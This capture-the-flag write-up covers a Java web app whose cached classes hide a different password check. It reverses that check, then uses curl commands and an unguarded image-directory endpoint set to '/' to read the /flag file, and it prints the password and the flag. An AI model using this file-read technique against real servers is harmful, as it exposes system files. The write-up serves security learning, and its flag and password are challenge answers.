# Leftovers

## Challenge recon

The jar contains the app classes (`de/kitctf/gpn24/leftovers/Server.class` and others), compiled
without debug info. They decompile cleanly. The `POST /set-image-dir` route checks the password like this:

```java
.check(in -> {
    char[] pw = "supersecret".toCharArray();
    return Arrays.equals(pw, in.password.toCharArray()) && pw[0] == 's';
}, "Invalid password")
```

## Main vuln

The "stale food" means here loading from cache. When you run with `-XX:AOTCache=cache.aot`, the JVM loads classes from the cache. The cached `Server` class was compiled from different source code than what's in the jar. 

You need to run the server normally with the cache active, then use the Serviceability Agent from a second JVM to dump the live classes from the cache. This reconstructs the actual classfiles from the `InstanceKlass` metadata:

```bash
my-jdk/bin/java -XX:AOTCache=cache.aot -jar leftovers.jar &   # pid=$!
my-jdk/bin/jhsdb clhsdb --pid $! <<'EOF'
dumpclass de.kitctf.gpn24.leftovers.Server
quit
EOF
```

The dumped `Server.class` is 8570 bytes vs 8212 in the jar. Decompiling it reveals the password check:

```java
char[] cArr = {233,202,'U','=','H',144,198,179,218,190,240,';'};
char[] p = in.password.toCharArray();
for (int i=0;i<p.length;i++) p[i] = (p[i]<'0'||p[i]>'9') ? (char)((byte)(((p[i]-'a'+13)%26)+97)) : p[i]; // ROT13 on letters
for (int i=0;i<p.length/2;i++) swap(p[i], p[p.length-1-i]);                                              // reverse the string
for (int i=0;i<p.length;i++) p[i] ^= cArr[i%cArr.length];                                                // XOR with key
return Arrays.equals(new char[]{208,243,'0','O','/',246,168,201,184,202,137,'U'}, p);
```

## Vulnerability and Solve

The password check can be reversed. Inverting the target array gives us the password:

```
recovered password: algomaster99
```

Once we have the password, we can set the image directory to any existing path (there's no path-traversal
guard). The `GET /images/{name}` endpoint then serves files from that directory using `folderPath.resolve(sanitize(name))`, where `sanitize` only 
allows `[a-zA-Z0-9_-]`.

The exploit:

1. Create a product named `flag`
2. Set the image directory to `/` using the recovered password
3. Request `/images/flag` to read the file at `/flag`

## Exploitation

```bash
PW=algomaster99

curl -X PUT $B/products/flag -H 'Content-Type: application/json' \
     -d '{"name":"flag","quantity":1,"bestBefore":"2030-01-01T00:00:00","notAfter":"2030-01-01T00:00:00"}'

curl -X POST $B/set-image-dir -H 'Content-Type: application/json' \
     -d '{"password":"algomaster99","newPath":"/"}'

curl $B/images/flag
```

## Flag
`GPNCTF{1efT_oR_RIgHT_cOde_c4ch3_v4lIDa71ON_S4YS_6OOD_Night}`
